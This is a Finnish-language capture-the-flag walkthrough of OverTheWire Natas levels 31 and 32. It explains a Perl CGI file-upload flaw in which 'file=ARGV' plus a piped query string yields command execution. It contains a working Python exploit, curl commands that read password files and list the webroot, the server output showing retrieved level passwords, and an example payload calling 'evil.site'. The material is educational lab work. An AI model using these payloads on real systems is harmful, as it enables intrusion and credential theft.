# natas 31 - START HERE;

aikaisemman natas 30 levelin mukaan piti runnata/suorittaa se python koodi (**pythonkoodi30.py**) niin sillä kautta sai sen natas 31 salasanansa.


natas31 ; m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

![alt text](./kuvat-level29-34/natas31-0.png)

![alt text](./kuvat-level29-34/natas31-1.png)

![alt text](./kuvat-level29-34/natas31-2.png)


Evästeen tarkistaminen (alempi kuva)

![alt text](./kuvat-level29-34/natas31-3.png)


Tässä ensimmäisenä etusivussa koskien on tiedostojen upottamista, että pari-muutama testauksena se toimii vian Excel (.csv) tiedontyyppisenä ja kuvasta toi pientä error:ia.

![alt text](./kuvat-level29-34/natas31-4.png)


Nyt tässä upotin jonkun excel taulukon ja just etusivun mukaan piti/pitää olla .csv tiedostoyyppinen.

![alt text](./kuvat-level29-34/natas31-5.png)

view-sourcce koodissa on kirjoitettu koskien tiedoston upottamista ja muita tiedostontyyppiä, niin upotettun jälkeen se tulosta jotakin formaatti taulukkoa ja just esim. tämä csv excel taulukko.

## pieni teoria

view-source html koodissa on tällinen skripti funktio if-else osuus ja while osuus kunnes täsmentyy niin saadaan se salasana.

Jossakin ohjeesa tai testeissä - esim. muiden sivustojen mukaan testannut .csv eli excel taulukon injektio hyökkäystä.

```
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;
```


- `param('file')` palauttaa lomakeparametrin sisällön:
  - Jos oikea tiedosto on lähetetty, `$file` on tiedostokahva → toimii oikein `while (<$file>)`.
  - Jos file-parametri on vain teksti, `$file` on pelkkä merkkijono → `while (<$file>)` ei toimi odotetusti.


- param() on kontekstiriippuvainen → voi palauttaa eri tyyppistä dataa.
- Tämä haavoittuvuus tunnetaan esim. nimellä "Perl file upload RCE".



🔒 Perl CGI:n tiedostonkäsittelyn haavoittuvuus – tiivis kuvaus::

- Perlissä `CGI->param('file')` voi palauttaa joko **tiedostokahvan** (kun oikea tiedosto on lähetetty) tai **pelkän merkkijonon** (esimerkiksi manipuloidusta lomakkeesta). Tämä johtuu siitä, että `param()` on **kontekstiriippuvainen** funktio.

- Jos saadun muuttujan sisältö (esim. `$file`) on **merkkijono**, eikä **tiedostokahva**, mutta sitä silti käytetään `while (<$file>)` tai `open($file)` -rakenteessa, koodi **ei toimi odotetusti** ja saattaa käyttäytyä **vaarallisesti**.

- Perlissä `open()`-funktio tulkitsee merkkijonot, jotka alkavat tai loppuvat **putkimerkillä** (`|`), **suoritettaviksi komennoiksi**. Tällöin käyttäjän syöte voi johtaa **komennon suorittamiseen palvelimella** (**RCE = Remote Code Execution**).

- Hyökkääjä voi huijata järjestelmää lähettämällä `file`-parametrin arvoksi merkkijonon kuten `"|id"` tai `"|curl http://evil.site|"`, jolloin CGI-skripti saattaa suorittaa tämän **komentona**.

- Tämän vuoksi on **äärimmäisen tärkeää tarkistaa**, että `$file` on oikeasti **tiedostokahva** eikä pelkkä **merkkijono** ennen kuin sitä käytetään lukemiseen tai `open()`-kutsussa.


**Lyhyesti sanottuna**: tässä tasossa käytetään CGI-pohjaista Perl-skriptiä, joka vastaanottaa HTML-lomakkeella lähetettyjä tiedostoja. Tämä toimii vähän kuin HTML5:n ja PHP:n tiedostojen lähetys, eli lomake lähettää `file`-nimisen kentän palvelimelle. Taustalla käytetty CGI-moduuli käsittelee tämän kentän, mutta siinä on haavoittuvuus: jos käyttäjä huijaa ja lähettää tiedoston nimen sijaan komennon (esim. `|ls`), voi tämä syöte päätyä suoraan Perl-koodiin ja suorittaa komentorivikäskyjä. Kyseessä on siis tiedostonlähetykseen liittyvä injektiohyökkäys (RCE).


**Jos parannuksena**, tiedostojen upottamisessa pitää käyttää tiettyä funktiota, joka poistaa mahdollisia polkuja ja estääkseen käyttäjän manipulointia tiedostojen polkua esim. linux termistönä ja komentona: `.../` eli tiedostojen injektiota. Toisekseen **tiedostopäätteet** joko rajoitettu tai sallittu vain turvallisiin tiedostotyyppiin mm. **.pdf** ja **.csv** , että validointia ja sanitointia joka sallii tiedostonnimensä ja lauseketta esim. `$filename =~ /^[a-zA-Z0-9_-]+\.(csv|txt)$/` - Tällä estetään haitallisten tiedostonimien syöttäminen.

**Muita huomioita**: Jos ohjelma tekee yhteyksiä ulkoisiin palveluihin tai suorittaa komentorivikäskyjä (esim. curl), nämä kutsut tulee tehdä kontrolloidusti. Käyttäjän syötteet tulee rajata valkoisella listalla (whitelist), jolloin vain ennalta hyväksytyt komennot tai URL-osoitteet sallitaan, ja vaaralliset komentorivit estetään.



## kali linux testausta - START HERE;

Tässä alkuun normaalia, pientä testausta ja tarkistusta

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas7.natas.labs.overthewire.org" 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas7.natas.labs.overthewire.org Port 80</address>
</body></html>



┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas31.natas.labs.overthewire.org/" -u "natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y" http://natas31.natas.labs.overthewire.org/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```


Tämä on vain malli ja yksi osa: `$curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=@natas31.csv;type=text/csv"`

Sama lisää testausta ja tarkistuksena, että miksi ja näin:

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl?etc/natas_webpass/natas32" -F "file=ARVG" -F "file=/Downloads/book1.csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```

Lisää curl komentojen testausta ja tarkistusta, sekä tässä vähittelen tulee kun yritettään upottaa tiedostoa sinne nettisivuston polkuun ja käyttäen tätä olemassa olevaa excel taulukon rakennetta eli yritettään saada pelittää.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=Downloads/Book1.csv;type=text/csv" 
```

Toinen testi:
```
$curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=@Book1.csv;type=text/csv" \
  http://natas31.natas.labs.overthewire.org/index.pl
  ```


**METHOD 1 (Python skripti):**
Tää on se toimiva Python skripti osuus, eli alemmaksi menee niin se toimii, tässä kali linux ohjelman alle laitoin "Book1.csv" excel taulukon normi copy-paste.

```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi31.py
#!/usr/bin/env python3
import requests

auth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
base_url = 'http://natas31.natas.labs.overthewire.org/index.pl'

# Komentoinjektio URL:iin
url = base_url + '?cat+/etc/natas_webpass/natas32+|'

# Lähetetään parametri file=ARGV (triggeröi komentoinjektion Perlin <ARGV>-käsittelyyn)
data = {'file': 'ARGV'}

# Tiedosto joka lähetetään (sisällöllä ei ole väliä, mutta sen on oltava olemassa!)
files = {'file': open('/home/kali/Downloads/Book1.csv', 'r')}  # <- muokkaa polku tarpeen mukaan

# POST-pyyntö CGI:lle
resp = requests.post(url, auth=auth, data=data, files=files)

# Tulostetaan palvelimen vastaus
print(resp.text)
```


toimiva versio (aikaisempi python skriptissä oli kirjoitus virhettä ja tässä piti määrittää toi polku)
```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi31.py
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


**TOINEN METHODI**, 
en uskonut tämäkin toimii mutta piti apua saada chatgpt:ltä ehdottomasti, koska testataan curl komentoa:


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=ARGV" \
  -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv" \
  "http://natas31.natas.labs.overthewire.org/index.pl?cat+/etc/natas_webpass/natas32+|"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


## pieni yhteenveto ja tutkiminen

Natas31:ssä kyse on nimenomaan Perl CGI -skriptin haavoittuvuudesta, joka liittyy tiedoston käsittelyyn ja komentoinjektioon


Kyseessä on **Remote Code Execution (RCE)** haavoittuvuus, joka syntyy siitä, että käyttäjän syötettä (parametria file) käytetään suoraan tiedoston lukemiseen ilman tarkistusta:
```
my $file = $cgi->param('file');
while (<$file>) {
   ...
}
```

ongelmana:
- Perl CGI käyttää käyttäjän syötettä suoraan tiedoston lukemiseen.
- Perl käsittelee tietyt merkkijonot, kuten `|komento`, erityisesti: se ajaa ne komentona.
- `file=ARGV` pakottaa Perlin lukemaan komentorivin argumentteja tiedostoina.
- Jos samalla URL:issa on injektoitu `|cat ...`, Perl suorittaa sen komentona.
- Tämä on klassinen **command injection** -haavoittuvuus, johtuen puutteellisesta syötteen validoinnista.


Jos testaisi toimisiko tämä hyökkäys pelkästään URL-injektiona, ilman tiedoston latausta, ja voiko tätä ajatella lineaarisesti:
- vastauksena: Ei, pelkkä URL-injektio ei riitä tässä tapauksessa – tiedoston lähettäminen (multipart/form-data) on välttämätöntä, jotta Perl CGI suostuu käsittelemään `file=...` niin kuin se tekee tässä haavoittuvuudessa.


Kuitenkin Natas31-harjoituksen ideana on hyödyntää CGI-skriptin haavoittuvuutta, jossa tiedoston latauksen yhteydessä voidaan suorittaa komentoinjektio. Käyttämällä esim. Burp Suitea, Python skriptillä tai curl-komentoa sekä satunnaista .csv-tiedostoa, voidaan ohittaa normaali toiminta ja suorittaa palvelimella komento, joka paljastaa natas32-tason salasanan.


## harjoitus ja lisätietoa links

https://learnhacking.io/overthewire-natas-level-31-walkthrough/


https://miaxu-src.github.io/natas/2021/09/17/natas31-walkthrough.html


https://lioxliu.wordpress.com/2020/12/27/overthewire-natas-level-31/


---

# natas 32 - start here;

natas32 : NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B


Alkuun natas 32 mukaan näyttää normaalilta, et vähä kuin natas 31 tason mukaan - voi olla vähä vaikeampi tasoinen. Upotin saman aikaisemman excel .csv taulukon et luki sisäisen taulukkon jutunsa lävitse ja toisti mitä siellä excel taulukkossa lukeekaan.

![alt text](./kuvat-level29-34/natas32-0.png)



![alt text](./kuvat-level29-34/natas32-1.png)


Tarkistettuna view source html voi olla pikkasen uutta/muokattua/parannettua versiota - voiko olla sama tiedoston injektio tyyppinen taso?

![alt text](./kuvat-level29-34/natas32-2.png)


## pieni teoria

Koskien view-source html:ää, mitä tässä koodissa lukekaan.

Kyseessä on Perl CGI-skripti, joka tarjoaa yksinkertaisen web-sivun, jossa voi ladata CSV-tiedoston, ja sitten se muuntaa CSV:n HTML-taulukoksi. Taulukko on myös lajiteltava (`sortable`) ja tyylitelty Bootstrapilla.


Pientä yksityiskohtaa:
- Skripti asettaa ympäristömuuttujan `$ENV{'TMPDIR'}` väliaikaistiedostojen hakemistoksi (tähän `/var/www/natas/natas32/tmp/`).
- CGI moduulia käytetään lomaketietojen käsittelyyn.
-tämä eroaa natas 31 aikaisemman tason, koska siellä saattoi lukea tiedostoa suoraan tai suorittaa komentoja suoraan GET-parametrillä.
- Tässä natas32:ssa pitää käyttää palvelimen binääriä, koska salasana on suojattu tiedoston oikeuksilla eli toisin sanoen on vähä parannettu "privilege escalation" tyyppinen taso. Kertauksena **natas31** oli tiedostojen upottamisen injektio keino, mutta nyt on kyseessä parannettu versio ja oikeuden taso.


## Kali linux 

Kali linux tarkistusta

Muutama ja pientä curl komentojen tarkistusta, että on pohja komentoja:

```
curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

$curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org
```

```
┌──(kali㉿kali)-[~]
└─$ curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

---

Tämä on se aikaisempi komento natas31:stä, mutta pientä muutosta ja ohjeiden mukaan haettu ja testataan. tässä tapahtui siis curl mikä käyttis (`-u`) username:password, sitten nettisivuston url ja polku /etc/ josta haettaan seuraava natas33:sen salasanansa. File ARGV joka on se suorittaa ohjauksensa **PERL CGI:tä** käyttämällä komentoriviparametriä tähän tiedostoa ja haluamme kokeilla uudestaan tätä olemassa olevaa excel tauluko tiedoston upottamisen injektiota.

- URL-osoitteessa viitataan /etc/-hakemistoon ja yritetään hakea seuraavan tason (natas33) salasanaa.
- Tiedostonimessä käytetään ARGV, joka ohjaa Perl CGI -skriptiä käyttämään sitä komentoriviparametrina.
- Tarkoitus on kokeilla uudelleen tätä aikaisemmin toiminutta tiedoston upottamiseen perustuvaa injektiota, jossa käytetään valmiina olevaa Excel-muotoista CSV-tiedostoa.
  - tämän testauksen (alemman komennon) jälkeen se ei anna sitä seuraavaa natas33:sen salasanaa, mutta hyvä testata ja kokeillakin.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


**Eteenpäin**:

```
curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
```

Nyt tässä suoritettiin sama kuin aikaisempi komento, mutta kummottiin jälkimmäisestä osasta kuin `index.pl?` eteenpäin jossa sijoitetin jotakin **linux komentojen injection parametriä**. 

Tulostuksena ainakin näyttävän Linux kirjastojen/tiedostojen oikeuksia, root ja jne, että koska luotu ja aika ja tässä osassa meitä kiinnostaa `</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword`

- `ls%20-l%20.%20|`, joka vastaa komentoa `ls -l .`
- Tämä näyttää nykyisen hakemiston sisällön pitkällä listauksella (mm. tiedosto-oikeudet ja omistajat). Tällä varmistan, että komentojen suoritus toimii ja että getpassword-tiedosto on olemassa ja SUID-root.
- Sama kuin linux ympäristössä kun syöttää komennon `$ls` - niin tarkistaa tämän polun hakemiston tiedostoa ja oikeutta.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 156
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


Nyt alkoi pelittää, koska aikaisemmassa (ylempi komento) testauksessa , niin meitä kiinnostaa toi polku **(./getpassword)** niin tähän polkuun url `/index.pl?` jälkeen pitää vähä rakentaa, jotta se alkaa pelittää siksi mentiin näin.

